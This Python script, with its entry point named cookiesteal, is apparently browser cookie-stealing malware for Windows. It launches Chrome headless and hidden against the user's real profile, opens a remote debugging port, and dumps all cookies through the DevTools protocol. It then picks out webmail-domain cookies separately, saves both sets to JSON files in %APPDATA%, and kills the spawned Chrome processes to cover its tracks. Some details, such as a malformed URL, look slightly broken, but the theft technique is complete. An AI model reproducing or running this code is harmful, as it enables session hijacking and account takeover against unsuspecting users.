import os
import subprocess
import requests
import time
import json
import websocket


class Cookiejar:
    def __init__(self, name="Default", domains={}):
        self.name = name
        self.domains = domains

    def add_cookie(self, domain, cookie):
        if cookie not in self.domains[domain]:
            self.domains[domain].append(cookie)
            return "SUCCESS"
        return "FAIL"

    def add_domain(self, domain):
        try:
            self.domains[domain]
        except KeyError:
            self.domains[domain] = []
        return "SUCCESS"

    def get_domain(self, domain):
        return(self.domains[domain])

    def get_broad_domain(self, broad_domain):
        response = {}
        for domain in self.domains:
            if broad_domain in domain and len(broad_domain) >= 3:
                response[domain] = []
                response[domain].append(self.domains[domain])
        return response

    def get_all(self):
        domain_list = []
        response = {}

        for domain in self.domains.keys():
            domain_list.append(domain)

        domain_list.sort(key=str.lower)

        for domain in domain_list:
            response[domain] = []
            response[domain].append(self.domains[domain])

        return response


def chrome_spawn(CHROME_CMD: list):
    CREATE_NO_WINDOW = 0x08000000
    processes = []
    for CMD in CHROME_CMD:
        process = subprocess.Popen(
            CMD, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=CREATE_NO_WINDOW)
        processes.append(process)
    time.sleep(2)
    return processes


def get_user_data_dir():
    return r"%LOCALAPPDATA%\Google\Chrome\User Data"


def get_chrome_cmd(port: int):
    CHROME_BASE = []
    CHROME_CMD = []
    user_data_dir = get_user_data_dir()
    remote_debugging_port = port

    # Windows 10
    CHROME_BASE.append(
        "\"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe\"")

    # Windows 7
    CHROME_BASE.append(
        "\"C:\Program Files (x86)\Google\Application\chrome.exe\"")

    CHROME_ARGS = [
        "https:://www.microsoft.com",
        "--headless",
        f"--user-data-dir=\"{user_data_dir}\"",
        f"--remote-debugging-port={remote_debugging_port}"
    ]

    CHROME_ARGS = " ".join(CHROME_ARGS)

    for CMD in CHROME_BASE:
        CHROME_CMD.append(f"{CMD} {CHROME_ARGS}")

    return CHROME_CMD


def send_cookie_request(port: int):
    response = requests.get(
        f"http://localhost:{port}/json")

    url = response.json()[0].get("webSocketDebuggerUrl")

    return url


def retrieve_cookies(url: str):
    QUERY = json.dumps({"id": 1, "method": "Network.getAllCookies"})
    ws = websocket.create_connection(url)
    ws.send(QUERY)
    result = ws.recv()
    ws.close()

    response = json.loads(result)
    cookies = response["result"]["cookies"]

    return cookies


def dump_cookies(cookies):
    cj = Cookiejar()
    appdata = os.getenv("APPDATA")

    # Add domains and cookies to Cookiejar
    for cookie in cookies:
        domain = cookie['domain']
        cj.add_domain(domain)
        cj.add_cookie(domain, cookie)

    cj.get_broad_domain("mail")
    cookies = json.dumps(cj.get_all(), indent=4)
    cookies_email = json.dumps(cj.get_broad_domain("mail"), indent=4)
    with open(f"{appdata}\\cookies.json", "w") as f:
        f.write(cookies)
    with open(f"{appdata}\\cookies_email.json", "w") as f:
        f.write(cookies_email)
    return (cookies, cookies_email)


def cleanup(processes: list):
    CREATE_NO_WINDOW = 0x08000000
    try:

        for process in processes:
            subprocess.run(
                f"taskkill /F /T /PID {process.pid}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=CREATE_NO_WINDOW)
    except Exception as err:
        pass
        # print(err)


def cookiesteal(port: int = 9222):
    CHROME_CMD = get_chrome_cmd(port=9222)

    processes = chrome_spawn(CHROME_CMD)
    url = send_cookie_request(port)

    cookies = retrieve_cookies(url)

    cleanup(processes)

    dump_cookies(cookies)


if __name__ == "__main__":
    cookiesteal()
